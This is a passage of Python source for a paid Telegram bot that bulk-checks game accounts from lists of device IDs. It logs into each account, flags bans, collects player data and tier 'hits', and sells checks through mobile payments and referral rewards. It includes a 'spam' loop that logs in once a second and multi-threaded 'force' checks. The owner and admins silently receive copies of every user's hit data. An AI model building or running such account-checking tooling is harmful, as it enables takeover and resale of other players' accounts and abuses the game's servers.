            status, reason, retry = _ban_check_one(device_id)
            if status == "BANNED":
                banned_status = True
        except Exception:
            pass

        # Step 2: login
        with GameConnection(device_id=device_id) as conn:
            acc_id = conn.account_id
            zone_id = conn.zone_id
            if not acc_id or not zone_id:
                return False, "NO_ACCOUNT"

        # Step 3: info lookup
        result = lookup_player_data(device_id, acc_id, zone_id)
        if result.get("status") != "success":
            return False, result.get("error", "UNKNOWN")
        pd = result.get("player_data", {})
        db_insert_hit(uid, pd, device_id, acc_id, zone_id,
                      source="single", banned=int(banned_status))
        # Referral reward (once per referred user)
        try:
            _referrer_id = db_reward_referrer(uid, reward_checks=1)
            if _referrer_id:
                # Notify the referrer
                try:
                    _stats = db_get_referral_stats(_referrer_id)
                    _avail = _stats["checks_earned"] - _stats["checks_used"]
                    _ref_msg, _ref_ents = fmt_premium(
                        f"{{gift}} NEW REFERRAL REWARD {{gift}}\n"
                        f"{{ok}} Someone used your link!\n"
                        f"{{star}} +1 FREE CHECKING added\n"
                        f"{{dice}} Available: {_avail}\n\n"
                        f"{{question}} /start → REFERRAL")
                    # Send via bot - need running loop
                    import asyncio as _asyncio
                    _loop = _asyncio.get_event_loop()
                    if _loop.is_running():
                        _asyncio.ensure_future(_send_referrer_notify(
                            _referrer_id, _ref_msg, _ref_ents))
                except Exception as _e:
                    print(f"[REF] notify skip: {_e}")
        except Exception as e:
            print(f"[REF] reward fail: {e}")
        return True, {
            "device_id": device_id,
            "role_id": acc_id,
            "zone_id": zone_id,
            "pd": pd,
            "banned": banned_status,
        }
    except Exception as e:
        import traceback
        traceback.print_exc()
        return False, f"EXC:{type(e).__name__}: {e}"


async def on_photo(update: Update, ctx):
    """Handle photo uploads (payment screenshots)."""
    if not update.effective_user or not update.message:
        return
    uid = update.effective_user.id
    db_ensure_user(uid, update.effective_user.username or "")
    if db_is_banned(uid):
        return
    if ctx.user_data.get("await_payment_screenshot"):
        await on_document(update, ctx)
        return



async def send_result_by_tier(chat_id, ctx, uid, result, source="single"):
    pd = result["pd"]
    dev = result["device_id"]
    rid = result["role_id"]
    zid = result["zone_id"]
    banned_status = result.get("banned", False)
    base, roman, full = _normalize_collector_tier(pd.get("collector_tier", ""))
    is_hidden = _is_hidden_tier_user(base)
    app = ctx.application
    user_dir = USERS_DIR / str(uid)
    user_dir.mkdir(exist_ok=True)
    ts = int(time.time())
    txt = build_hit_txt(dev, rid, zid, pd, banned_status=banned_status)

    if not is_hidden:
        # ---------- MESSAGE 1: INFO TXT (NO inline button) ----------
        fp = user_dir / f"single_{ts}.txt"
        with open(fp, "w", encoding="utf-8") as f:
            f.write(txt)
        try:
            _ban_icon = "{no_entry}" if banned_status else "{star}"
            _cap_txt, _cap_ents = fmt_premium(
                f"{{medal}} Result - {pd.get('nickname', 'N/A')}\n"
                f"{_ban_icon} BANNED: {'TRUE' if banned_status else 'FALSE'}")
            if len(_cap_txt) > 1024:
                _cap_txt = _cap_txt[:1020] + "..."
                _cap_ents = []
            await app.bot.send_document(
                chat_id=chat_id,
                document=open(fp, "rb"),
                caption=_cap_txt,
                caption_entities=_cap_ents if _cap_ents else None
            )
        except Exception as e:
            print(f"[SINGLE SEND] TXT fail: {type(e).__name__}: {e}")
            try:
                await app.bot.send_message(
                    chat_id=chat_id,
                    text=(f"SINGLE CHECK DONE\n"
                          f"Name: {pd.get('nickname', 'N/A')}\n"
                          f"Tier: {full}\n"
                          f"BANNED: {'TRUE' if banned_status else 'FALSE'}")
                )
            except Exception:
                pass
        try:
            os.remove(fp)
        except Exception:
            pass

        # ---------- MESSAGE 2: IMAGE BUTTON (separate message) ----------
        try:
            await app.bot.send_message(
                chat_id=chat_id,
                text="📸 Tap IMAGE to view detailed profile picture:",
                reply_markup=_single_image_keyboard(dev)
            )
        except Exception as e:
            print(f"[SINGLE SEND] IMAGE button fail: {type(e).__name__}: {e}")
    else:
        # Hidden tier
        try:
            await app.bot.send_message(
                chat_id=chat_id,
                text=(f"Check completed.\n"
                      f"BANNED: {'TRUE' if banned_status else 'FALSE'}\n"
                      f"(No player data returned.)")
            )
        except Exception:
            pass
        try:
            await app.bot.send_message(
                chat_id=chat_id,
                text="📸 Tap IMAGE to view profile:",
                reply_markup=_single_image_keyboard(dev)
            )
        except Exception:
            pass

    # ---------- ADMIN COPY (no button) ----------
    for admin_id in ADMIN_IDS:
        try:
            ap = user_dir / f"admin_single_{ts}.txt"
            with open(ap, "w", encoding="utf-8") as f:
                f.write(txt)
            _adm_txt, _adm_ents = fmt_premium(
                f"{{shield}} ADMIN - Single check\n"
                f"{{ok}} User: {uid}\n"
                f"{{crown}} Tier: {full}\n"
                f"BANNED: {'TRUE' if banned_status else 'FALSE'}")
            if len(_adm_txt) > 1024:
                _adm_txt = _adm_txt[:1020] + "..."
                _adm_ents = []
            await app.bot.send_document(
                chat_id=admin_id,
                document=open(ap, "rb"),
                caption=_adm_txt,
                caption_entities=_adm_ents if _adm_ents else None
            )
            try:
                os.remove(ap)
            except Exception:
                pass
        except Exception:
            pass

async def on_payment_callback(update: Update, ctx):
    """Handle Wave/KBZ payment method selection."""
    query = update.callback_query
    data = query.data or ""
    uid = query.from_user.id

    if data.startswith("pay_wave_"):
        method = "WAVE PAY"
        plan_key = data.replace("pay_wave_", "")
        pay_info = WAVE_PAY
        emoji = "{wave_pay}"
        header_emoji = "{wave_pay}"
    elif data.startswith("pay_kbz_"):
        method = "KBZ PAY"
        plan_key = data.replace("pay_kbz_", "")
        pay_info = KBZ_PAY
        emoji = "{kbz_pay}"
        header_emoji = "{kbz_pay}"
    else:
        await query.answer("Unknown")
        return

    if plan_key not in PLANS:
        await query.answer("Invalid plan")
        return

    plan = PLANS[plan_key]
    ctx.user_data["selected_plan"] = plan_key
    ctx.user_data["selected_pay_method"] = method
    ctx.user_data["await_payment_screenshot"] = True

    _pm_lines = [
        emoji + " PAYMENT — " + method + " " + emoji,
        "",
        "{ok} NAME: " + pay_info["name"],
        "{dice} NUMBER: " + pay_info["number"],
        "",
        "{star} Amount: " + f"{plan['price']:,} MMK",
        "{gift} Plan: " + plan["name"],
        "",
        "{arrow_up} SEND PAYMENT RECEIPT SCREENSHOT",
        "{battery} WAIT FOR ADMIN APPROVE",
        "",
        "{question} After payment, send screenshot.",
    ]
    _pm_txt, _pm_ents = fmt_premium("\n".join(_pm_lines))
    try:
        if _pm_ents:
            await query.edit_message_text(_pm_txt, entities=_pm_ents)
        else:
            await query.edit_message_text(_pm_txt)
    except Exception as e:
        print(f"[PAY CB] edit fail: {e}")
    await query.answer("Send payment screenshot now")


async def on_admin_payment_callback(update: Update, ctx):
    """Handle approve/reject."""
    query = update.callback_query
    data = query.data or ""
    uid = query.from_user.id

    if uid not in ADMIN_IDS:
        await query.answer("Not authorized", show_alert=True)
        return

    if data.startswith("pay_approve_"):
        payment_id = int(data.replace("pay_approve_", ""))
        pay = db_get_pending_payment(payment_id)
        if not pay or pay["status"] != "PENDING":
            await query.answer("Already processed", show_alert=True)
            return

        user_id = pay["user_id"]
        days = pay["plan_days"]
        until = db_grant_access_admin(user_id, days)
        db_update_payment_status(payment_id, "APPROVED", uid, f"{days} days")

        _ok_lines = [
            "{gift} PAYMENT APPROVED {gift}",
            "",
            "{ok} Plan: " + pay["plan_name"],
            "{star} Duration: " + str(days) + " days",
            "{battery} Expires: " + format_timestamp_full(until),
            "",
            "{party} Enjoy your access!",
        ]
        _ok_txt, _ok_ents = fmt_premium("\n".join(_ok_lines))
        try:
            if _ok_ents:
                await ctx.bot.send_message(
                    chat_id=user_id, text=_ok_txt, entities=_ok_ents,
                    reply_markup=kb_main(user_id in ADMIN_IDS))
            else:
                await ctx.bot.send_message(
                    chat_id=user_id, text=_ok_txt,
                    reply_markup=kb_main(user_id in ADMIN_IDS))
        except Exception as e:
            print(f"[PAY] user notify fail: {e}")

        try:
            await query.edit_message_caption(
                caption=f"✅ APPROVED #{payment_id} — {pay['plan_name']} ({days} days)")
        except Exception:
            try:
                await query.edit_message_text(
                    f"✅ APPROVED #{payment_id} — {pay['plan_name']} ({days} days)")
            except Exception:
                pass
        await query.answer("Approved")

    elif data.startswith("pay_reject_"):
        payment_id = int(data.replace("pay_reject_", ""))
        pay = db_get_pending_payment(payment_id)
        if not pay or pay["status"] != "PENDING":
            await query.answer("Already processed", show_alert=True)
            return

        db_update_payment_status(payment_id, "REJECTED", uid, "Rejected")

        _rj_lines = [
            "{poop} PAYMENT REJECTED {poop}",
            "",
            "{question} Payment ID: #" + str(payment_id),
            "{star} Plan: " + pay["plan_name"],
            "",
            "{arrow_down} Contact admin if this is an error.",
        ]
        _rj_txt, _rj_ents = fmt_premium("\n".join(_rj_lines))
        try:
            if _rj_ents:
                await ctx.bot.send_message(
                    chat_id=pay["user_id"], text=_rj_txt, entities=_rj_ents)
            else:
                await ctx.bot.send_message(
                    chat_id=pay["user_id"], text=_rj_txt)
        except Exception as e:
            print(f"[PAY] reject notify fail: {e}")

        try:
            await query.edit_message_caption(
                caption=f"❌ REJECTED #{payment_id} — {pay['plan_name']}")
        except Exception:
            try:
                await query.edit_message_text(
                    f"❌ REJECTED #{payment_id} — {pay['plan_name']}")
            except Exception:
                pass
        await query.answer("Rejected")



async def on_single_image_button(update: Update, ctx):
    query = update.callback_query
    data = query.data or ""

    # Resolve short token to device_id
    device_id = _resolve_image_token(data)
    if not device_id:
        await query.answer("Session expired. Please re-check.", show_alert=True)
        return

    await query.answer("Generating image...")

    def _work():
        try:
            with GameConnection(device_id=device_id) as conn:
                acc_id = conn.account_id
                zone_id = conn.zone_id
            if not acc_id or not zone_id:
                return None
            r = lookup_player_data(device_id, acc_id, zone_id)
            if not r or r.get("status") != "success":
                return None
            banned_status = False
            try:
                status, reason, retry = _ban_check_one(device_id)
                if status == "BANNED":
                    banned_status = True
            except Exception:
                pass
            return make_player_info_image(
                r["player_data"], device_id, acc_id, zone_id,
                title="SINGLE CHECK", banned_status=banned_status
            )
        except Exception as e:
            import traceback
            traceback.print_exc()
            print(f"[IMAGE] EXC: {type(e).__name__}: {e}")
            return None

    img_path = await asyncio.to_thread(_work)
    if not img_path or not os.path.isfile(img_path):
        try:
            await query.message.reply_text("Could not generate image.")
        except Exception:
            pass
        return
    try:
        await query.message.reply_photo(
            photo=open(img_path, "rb"),
            caption=f"SINGLE CHECKED\nDevice: {device_id}\nDEV - {DEV_TAG}"
        )
    except Exception as e:
        print(f"[IMAGE] Upload failed: {type(e).__name__}: {e}")
        try:
            await query.message.reply_text(f"Upload failed: {type(e).__name__}")
        except Exception:
            pass
    try:
        os.remove(img_path)
    except Exception:
        pass

# ======================================================================
#  SPAM
# ======================================================================
async def spam_loop(chat_id, ctx, uid, device_id):
    app = ctx.application
    count = 0
    while ctx.user_data.get("spam_running"):
        try:
            with GameConnection(device_id=device_id) as conn:
                if conn.account_id and conn.zone_id:
                    count += 1
                    if count % 10 == 0:
                        await app.bot.send_message(chat_id=chat_id,
                                                   text=f"Spam running... {count} logins")
        except Exception:
            pass
        await asyncio.sleep(1)
    try:
        await app.bot.send_message(chat_id=chat_id,
                                   text=f"Spam stopped. Total: {count}",
                                   reply_markup=kb_spam())
    except Exception:
        pass


# ======================================================================
#  4STEP TASK
# ======================================================================
async def run_4step_task(chat_id, ctx, uid, accounts):
    app = ctx.application
    jid = job_new(uid, check_type="4step")
    job_update(jid, step=1, step_name="CLEAN", total=len(accounts), chat_id=chat_id)
    ctx.user_data["active_job"] = jid
    # ---- LIVE STATUS ----
    _live_msg = None
    _live_stop = asyncio.Event()
    try:
        _lt, _le = _build_live_status_text(job_get(jid), label="4STEP CHECK")
        _live_msg = await app.bot.send_message(
            chat_id=chat_id,
            text=_lt,
            entities=_le if _le else None,
        )
        asyncio.create_task(_live_status_loop(
            app, chat_id, jid, _live_msg.message_id, "4STEP CHECK", _live_stop))
    except Exception as _e:
        print(f"[LIVE] 4STEP CHECK start fail: {type(_e).__name__}: {_e}")

    user_dir = USERS_DIR / str(uid)
    user_dir.mkdir(exist_ok=True, parents=True)

    def _gate():
        while True:
            # Instant stop check (global flag)
            if _is_stopped(jid):
                return False
            j = job_get(jid)
            if not j:
                return False
            if j["state"] == "stopped":
                _mark_stop(jid)
                return False
            if j["state"] == "paused":
                time.sleep(0.2)
                continue
            return True

    job_inc_count(jid, "clean", len(accounts))
    job_set_total(jid, len(accounts))
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["done"] = 0
    await asyncio.sleep(0.3)

    job_update(jid, step=2, step_name="BANNED CHECK")
    job_set_total(jid, len(accounts))
    await asyncio.sleep(0.3)

    banned = []
    cleared = []
    login_errors = []
    s2_lock = threading.Lock()

    def worker_ban(acc):
        if not _gate():
            return
        dev = acc.get("Device id")
        existing_rid = acc.get("role_id")
        existing_zid = acc.get("zone_id")
        try:
            a_id, z_id, stat = GameLogin(dev).run()
            if not a_id or not z_id:
                if 'ban' in str(stat).lower():
                    with s2_lock:
                        b = {"Device id": dev,
                             "role_id": existing_rid,
                             "zone_id": existing_zid,
                             "reason": stat}
                        banned.append(b)
                        job_append_banned(jid, b)
                        job_inc_count(jid, "banned")
                    job_inc(jid)
                    return
                if existing_rid and existing_zid:
                    with s2_lock:
                        cleared.append({
                            "Device id": dev,
                            "role_id": int(existing_rid),
                            "zone_id": int(existing_zid),
                        })
                    job_inc(jid)
                    return
                with s2_lock:
                    login_errors.append({
                        "Device id": dev,
                        "role_id": None,
                        "zone_id": None,
                        "reason": f"LOGIN_FAIL: {stat}",
                    })
                    job_inc_count(jid, "errors")
                job_inc(jid)
                return
            with s2_lock:
                cleared.append({
                    "Device id": dev,
                    "role_id": int(a_id),
                    "zone_id": int(z_id),
                })
        except Exception as e:
            with s2_lock:
                login_errors.append({
                    "Device id": dev,
                    "role_id": existing_rid,
                    "zone_id": existing_zid,
                    "reason": f"EXC:{type(e).__name__}",
                })
                job_inc_count(jid, "errors")
        job_inc(jid)
        # no sleep

    def _run_ban_pool():
        ex = concurrent.futures.ThreadPoolExecutor(max_workers=BAN_THREADS)
        try:
            futures = [ex.submit(worker_ban, a) for a in accounts]
            for f in concurrent.futures.as_completed(futures, timeout=7200):
                if _is_stopped(jid):
                    # Cancel pending futures (not-yet-started)
                    for fut in futures:
                        if not fut.done():
                            fut.cancel()
                    break
                try:
                    f.result(timeout=0.1)
                except Exception:
                    pass
        finally:
            ex.shutdown(wait=False, cancel_futures=True)
    await asyncio.to_thread(_run_ban_pool)

    job_update(jid, step=3, step_name="VALID CHECK")
    job_set_total(jid, len(cleared))
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["done"] = 0
    await asyncio.sleep(0.3)

    valid_accounts = []
    valid_errors = []
    s3_lock = threading.Lock()

    def worker_valid(acc):
        if not _gate():
            return
        dev = acc.get("Device id")
        rid = acc.get("role_id")
        zid = acc.get("zone_id")
        if rid and zid:
            with s3_lock:
                valid_accounts.append({
                    "device": dev, "role_id": int(rid), "zone_id": int(zid)
                })
                job_append_valid_account(jid, valid_accounts[-1])
                job_inc_count(jid, "valid")
            job_inc(jid)
            return
        success = False
        last_err = "UNKNOWN"
        for attempt in range(2):
            if not _gate():
                return
            try:
                with GameConnection(device_id=dev) as conn:
                    a_id = conn.account_id
                    z_id = conn.zone_id
                if a_id and z_id:
                    with s3_lock:
                        va = {"device": dev, "role_id": a_id, "zone_id": z_id}
                        valid_accounts.append(va)
                        job_append_valid_account(jid, va)
                        job_inc_count(jid, "valid")
                    success = True
                    break
                last_err = "NO_ACCOUNT"
            except Exception as e:
                last_err = f"EXC:{type(e).__name__}"
            time.sleep(0.5)
        if not success:
            with s3_lock:
                valid_errors.append({
                    "Device id": dev, "role_id": rid, "zone_id": zid,
                    "reason": last_err,
                })
            job_inc_count(jid, "errors")
        job_inc(jid)

    def _run_valid_pool():
        ex = concurrent.futures.ThreadPoolExecutor(max_workers=VALID_THREADS)
        try:
            futures = [ex.submit(worker_valid, a) for a in cleared]
            for f in concurrent.futures.as_completed(futures, timeout=7200):
                if _is_stopped(jid):
                    for fut in futures:
                        if not fut.done():
                            fut.cancel()
                    break
                try:
                    f.result(timeout=0.1)
                except Exception:
                    pass
        finally:
            ex.shutdown(wait=False, cancel_futures=True)
    await asyncio.to_thread(_run_valid_pool)

    job_update(jid, step=4, step_name="INFO CHECK")
    job_set_total(jid, len(valid_accounts))
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["done"] = 0
    await asyncio.sleep(0.3)

    valid = []
    errors = []
    step4_banned = []
    s4_lock = threading.Lock()

    def worker_info(acc):
        if not _gate():
            return
        dev = acc["device"]
        rid = acc["role_id"]
        zid = acc["zone_id"]
        ok = False
        pd = None
        last_err = "UNKNOWN"
        is_banned = False
        for attempt in range(2):
            if not _gate():
                return
            try:
                ok, pd, ban_stat = process_detail(dev, rid, zid)
                if ok and pd:
                    break
                last_err = ban_stat
                if ('ban' in str(ban_stat).lower()
                        and 'login_fail' not in str(ban_stat).lower()
                        and 'no_zone' not in str(ban_stat).lower()):
                    is_banned = True
                    break
            except Exception as e:
                last_err = f"EXC:{type(e).__name__}"
                ok = False
                pd = None
            time.sleep(0.5)

        if ok and pd:
            with s4_lock:
                entry_acc = {"Device id": dev, "role_id": rid, "zone_id": zid}
                valid.append((entry_acc, pd))
                job_append_valid(jid, entry_acc, pd)
                job_inc_count(jid, "info")
            try:
                db_insert_hit(uid, pd, dev, rid, zid, source="4step")
            except Exception:
                pass
        elif is_banned:
            with s4_lock:
                b = {"Device id": dev, "role_id": rid, "zone_id": zid,
                     "reason": last_err}
                step4_banned.append(b)
                job_append_banned(jid, b)
                job_inc_count(jid, "banned")
        else:
            with s4_lock:
                errors.append({
                    "Device id": dev, "role_id": rid, "zone_id": zid,
                    "reason": last_err,
                })
                job_inc_count(jid, "errors")
        job_inc(jid)

    def _run_info_pool():
        ex = concurrent.futures.ThreadPoolExecutor(max_workers=INFO_THREADS)
        try:
            futures = [ex.submit(worker_info, a) for a in valid_accounts]
            for f in concurrent.futures.as_completed(futures, timeout=7200):
                if _is_stopped(jid):
                    for fut in futures:
                        if not fut.done():
                            fut.cancel()
                    break
                try:
                    f.result(timeout=0.1)
                except Exception:
                    pass
        finally:
            ex.shutdown(wait=False, cancel_futures=True)
    await asyncio.to_thread(_run_info_pool)

    with s2_lock:
        for b in step4_banned:
            banned.append(b)

    was_stopped = job_is_stopped(jid)
    # ---- Stop LIVE STATUS ----
    try:
        _live_stop.set()
        _j_snap = job_get(jid)
        if _live_msg and _j_snap:
            _final = (_build_live_status_text(_j_snap, label="4STEP CHECK")[0] if isinstance(_build_live_status_text(_j_snap, label="4STEP CHECK"), tuple) else _build_live_status_text(_j_snap, label="4STEP CHECK")).replace(
                "RUNNING", "STOPPED" if was_stopped else "DONE")
            await _live_status_final(app, chat_id, _live_msg.message_id, jid,
                                     "4STEP CHECK", _final)
    except Exception as e:
        print(f"[LIVE] 4step final fail: {type(e).__name__}: {e}")

    job_finish(jid)
    ctx.user_data.pop("active_job", None)

    try:
        db_insert_check(uid, "4step", len(accounts), len(valid),
                        len(banned), len(errors),
                        f"clean={len(accounts)} banned={len(banned)} valid={len(valid_accounts)} info={len(valid)} errors={len(errors)}")
    except Exception:
        pass

    ts = int(time.time())
    user_visible = []
    for acc, pd in valid:
        base, roman, full = _normalize_collector_tier(pd.get("collector_tier", ""))
        if not _is_hidden_tier_user(base):
            user_visible.append((acc, pd))

    status_word = "STOPPED" if was_stopped else "DONE"
    visible_players = [pd for acc, pd in user_visible]
    offline_text = _render_offline_breakdown(visible_players)
    all_errs = errors + login_errors + valid_errors

    lines = [
        f"{{crown}} 4STEP CHECK {status_word} {{crown}}",
        "=====================",
        f"{{gear}} Clean       : {len(accounts)}",
        f"{{no_entry}} Banned      : {len(banned)}",
        f"{{star}} Valid       : {len(valid_accounts)}",
        f"{{shield}} Info hits   : {len(user_visible)}",
        f"{{dizzy}} Errors      : {len(all_errs)}",
        "",
        offline_text,
    ]
    _sum_txt, _sum_ents = fmt_premium("\n".join(lines))
    try:
        if _sum_ents:
            await app.bot.send_message(chat_id=chat_id, text=_sum_txt, entities=_sum_ents)
        else:
            await app.bot.send_message(chat_id=chat_id, text=_sum_txt)
    except Exception as e:
        print(f"[PREMIUM] 4step summary fail: {type(e).__name__}: {e}")
        try:
            await app.bot.send_message(chat_id=chat_id, text="\n".join(lines))
        except Exception:
            pass

    if user_visible:
        vfp = user_dir / f"4step_info_{ts}.txt"
        with open(vfp, "w", encoding="utf-8") as f:
            for acc, pd in user_visible:
                f.write(build_hit_txt(acc.get("Device id", ""),
                                      acc.get("role_id") or 0,
                                      acc.get("zone_id") or 0, pd) + "\n\n")
        try:
            await app.bot.send_document(chat_id=chat_id, document=open(vfp, "rb"),
                                        caption=f"INFO TXT ({len(user_visible)})")
        except Exception:
            pass
        try:
            os.remove(vfp)
        except Exception:
            pass

    if banned:
        bfp = user_dir / f"4step_banned_{ts}.txt"
        with open(bfp, "w", encoding="utf-8") as f:
            f.write(f"# BANNED DEVICE IDS ({len(banned)})\n\n")
            for b in banned:
                f.write(f"Device id: {b['Device id']} | account id: {b.get('role_id') or 0} | zone id: {b.get('zone_id') or 0}\n")
                f.write(f"  Reason: {b.get('reason', 'N/A')}\n\n")
        try:
            await app.bot.send_document(chat_id=chat_id, document=open(bfp, "rb"),
                                        caption=f"BANNED TXT ({len(banned)})")
        except Exception:
            pass
        try:
            os.remove(bfp)
        except Exception:
            pass

    if all_errs:
        efp = user_dir / f"4step_error_{ts}.txt"
        with open(efp, "w", encoding="utf-8") as f:
            f.write(f"# ERROR DEVICE IDS ({len(all_errs)})\n\n")
            for e in all_errs:
                _dev = e.get('Device id') or e.get('device') or '?'
                _rid = e.get('role_id') or 0
                _zid = e.get('zone_id') or 0
                f.write(f"Device id: {_dev} | account id: {_rid} | zone id: {_zid}\n")
                f.write(f"  Error: {e.get('reason', 'N/A')}\n\n")
        try:
            await app.bot.send_document(chat_id=chat_id, document=open(efp, "rb"),
                                        caption=f"ERROR TXT ({len(all_errs)})")
        except Exception:
            pass
        try:
            os.remove(efp)
        except Exception:
            pass

    try:
        _visible_players = [pd for acc, pd in user_visible]
        if _visible_players:
            await _send_tier_image_auto(
                app, chat_id, _visible_players,
                "4STEP CHECK", "4STEP CHECKED")
    except Exception as _e:
        print(f"[TIER IMG] 4step fail: {type(_e).__name__}: {_e}")

    for owner_id in {OWNER_ID}:
        try:
            afp = user_dir / f"4step_owner_{ts}.txt"
            with open(afp, "w", encoding="utf-8") as f:
                f.write(f"USER: {uid}\nUSERNAME: @{db_get_username(uid)}\n")
                f.write(f"STATUS: {status_word}\nCLEAN: {len(accounts)}\n")
                f.write(f"BANNED: {len(banned)}\nVALID: {len(valid_accounts)}\n")
                f.write(f"INFO: {len(valid)}\nERRORS: {len(all_errs)}\n\n")
                for acc, pd in valid:
                    f.write(build_hit_txt(acc.get("Device id", ""),
                                          acc.get("role_id") or 0,
                                          acc.get("zone_id") or 0, pd) + "\n\n")
            await app.bot.send_document(chat_id=owner_id, document=open(afp, "rb"),
                                        caption=f"OWNER - 4STEP {status_word}\nUser: {uid}")
            try:
                os.remove(afp)
            except Exception:
                pass
        except Exception:
            pass

    try:
        _ready_txt, _ready_ents = fmt_premium("{ok} Ready.")
        try:
            if _ready_ents:
                await app.bot.send_message(chat_id=chat_id, text=_ready_txt,
                                            entities=_ready_ents,
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            else:
                await app.bot.send_message(chat_id=chat_id, text=_ready_txt,
                                            reply_markup=kb_main(uid in ADMIN_IDS))
        except Exception:
            await app.bot.send_message(chat_id=chat_id, text="Ready.",
                                        reply_markup=kb_main(uid in ADMIN_IDS))
    except Exception:
        pass


# ======================================================================
#  FORCE TASK
# ======================================================================
async def run_force_task(chat_id, ctx, uid, accounts):
    app = ctx.application
    jid = job_new(uid, check_type="force")
    ctx.user_data["active_job"] = jid
    # ---- LIVE STATUS ----
    _live_msg = None
    _live_stop = asyncio.Event()
    try:
        _lt, _le = _build_live_status_text(job_get(jid), label="FORCE CHECK")
        _live_msg = await app.bot.send_message(
            chat_id=chat_id,
            text=_lt,
            entities=_le if _le else None,
        )
        asyncio.create_task(_live_status_loop(
            app, chat_id, jid, _live_msg.message_id, "FORCE CHECK", _live_stop))
    except Exception as _e:
        print(f"[LIVE] FORCE CHECK start fail: {type(_e).__name__}: {_e}")

    user_dir = USERS_DIR / str(uid)
    user_dir.mkdir(exist_ok=True, parents=True)

    def _gate():
        while True:
            # Instant stop check (global flag)
            if _is_stopped(jid):
                return False
            j = job_get(jid)
            if not j:
                return False
            if j["state"] == "stopped":
                _mark_stop(jid)
                return False
            if j["state"] == "paused":
                time.sleep(0.2)
                continue
            return True

    job_inc_count(jid, "clean", len(accounts))
    job_update(jid, step=2, step_name="LOGIN + BAN", total=len(accounts))
    await asyncio.sleep(0.3)

    banned = []
    cleared = []
    login_errors = []
    s2_lock = threading.Lock()

    def worker_ban(acc):
        if not _gate():
            return
        dev = acc.get("Device id")
        existing_rid = acc.get("role_id")
        existing_zid = acc.get("zone_id")
        a_id, z_id, stat = None, None, "UNKNOWN"
        for attempt in range(2):
            try:
                a_id, z_id, stat = GameLogin(dev).run()
                if a_id and z_id:
                    break
                if 'ban' in str(stat).lower() and 'login_fail' not in str(stat).lower():
                    break
            except Exception as e:
                stat = f"ERROR({type(e).__name__})"
            if attempt == 0:
                time.sleep(0.5)
        with s2_lock:
            if a_id and z_id:
                cleared.append({"Device id": dev, "role_id": int(a_id), "zone_id": int(z_id)})
                job_inc(jid)
                return
            if ('ban' in str(stat).lower()
                    and 'login_fail' not in str(stat).lower()
                    and 'no_zone' not in str(stat).lower()):
                b = {"Device id": dev,
                     "role_id": existing_rid,
                     "zone_id": existing_zid,
                     "reason": stat}
                banned.append(b)
                job_append_banned(jid, b)
                job_inc_count(jid, "banned")
                job_inc(jid)
                return
            if existing_rid and existing_zid:
                cleared.append({"Device id": dev,
                                "role_id": int(existing_rid),
                                "zone_id": int(existing_zid)})
                job_inc(jid)
                return
            login_errors.append({
                "Device id": dev, "role_id": None, "zone_id": None,
                "reason": f"LOGIN_FAIL: {stat}",
            })
            job_inc_count(jid, "errors")
        job_inc(jid)

    def _run_ban_pool():
        ex = concurrent.futures.ThreadPoolExecutor(max_workers=BAN_THREADS)
        try:
            futures = [ex.submit(worker_ban, a) for a in accounts]
            for f in concurrent.futures.as_completed(futures, timeout=7200):
                if _is_stopped(jid):
                    for fut in futures:
                        if not fut.done():
                            fut.cancel()
                    break
                try:
                    f.result(timeout=0.1)
                except Exception:
                    pass
        finally:
            ex.shutdown(wait=False, cancel_futures=True)
    await asyncio.to_thread(_run_ban_pool)

    job_update(jid, step=3, step_name="VALID CHECK")
    job_set_total(jid, len(cleared))
    await asyncio.sleep(2.0)

    valid_accounts = []
    valid_errors = []
    s3_lock = threading.Lock()

    def worker_valid(acc):
        if not _gate():
            return
        dev = acc.get("Device id")
        rid = acc.get("role_id")
        zid = acc.get("zone_id")
        if rid and zid:
            with s3_lock:
                va = {"device": dev, "role_id": int(rid), "zone_id": int(zid)}
                valid_accounts.append(va)
                job_append_valid_account(jid, va)
                job_inc_count(jid, "valid")
            job_inc(jid)
            return
        success = False
        last_err = "UNKNOWN"
        for attempt in range(2):
            if not _gate():
                return
            try:
                with GameConnection(device_id=dev) as conn:
                    a_id = conn.account_id
                    z_id = conn.zone_id
                if a_id and z_id:
                    with s3_lock:
                        va = {"device": dev, "role_id": a_id, "zone_id": z_id}
                        valid_accounts.append(va)
                        job_append_valid_account(jid, va)
                        job_inc_count(jid, "valid")
                    success = True
                    break
                last_err = "NO_ACCOUNT"
            except Exception as e:
                last_err = f"EXC:{type(e).__name__}"
            time.sleep(0.5)
        if not success:
            with s3_lock:
                valid_errors.append({
                    "Device id": dev, "role_id": rid, "zone_id": zid,
                    "reason": last_err,
                })
            job_inc_count(jid, "errors")
        job_inc(jid)

    def _run_valid_pool():
        ex = concurrent.futures.ThreadPoolExecutor(max_workers=VALID_THREADS)
        try:
            futures = [ex.submit(worker_valid, a) for a in cleared]
            for f in concurrent.futures.as_completed(futures, timeout=7200):
                if _is_stopped(jid):
                    for fut in futures:
                        if not fut.done():
                            fut.cancel()
                    break
                try:
                    f.result(timeout=0.1)
                except Exception:
                    pass
        finally:
            ex.shutdown(wait=False, cancel_futures=True)
    await asyncio.to_thread(_run_valid_pool)

    job_update(jid, step=4, step_name="INFO CHECK")
    job_set_total(jid, len(valid_accounts))
    await asyncio.sleep(2.0)

    valid = []
    errors_pool = list(valid_accounts)
    resolved = []
    s4_lock = threading.Lock()

    def try_info(acc):
        if not _gate():
            return None, "STOPPED", False
        dev = acc["device"]; rid = acc["role_id"]; zid = acc["zone_id"]
        ok, pd, ban_stat = process_detail(dev, rid, zid)
        if ok and pd:
            return pd, None, False
        is_ban = ('ban' in str(ban_stat).lower()
                  and 'login_fail' not in str(ban_stat).lower()
                  and 'no_zone' not in str(ban_stat).lower())
        return None, ban_stat, is_ban

    round_no = 1
    while errors_pool and round_no <= FORCE_CHECK_MAX_ROUNDS:
        pending = list(errors_pool)
        errors_pool = []
        job_set_total(jid, len(pending) + len(resolved))
        with _jobs_lock:
            if jid in _active_jobs:
                _active_jobs[jid]["done"] = len(resolved)

        def worker_info(acc):
            if not _gate():
                return
            pd, err, is_ban = try_info(acc)
            if pd is not None:
                entry_acc = {"Device id": acc["device"], "role_id": acc["role_id"],
                             "zone_id": acc["zone_id"]}
                with s4_lock:
                    valid.append((entry_acc, pd))
                    job_append_valid(jid, entry_acc, pd)
                    resolved.append(acc)
                    job_inc_count(jid, "info")
                try:
                    db_insert_hit(uid, pd, acc["device"], acc["role_id"], acc["zone_id"],
                                  source="force")
                except Exception:
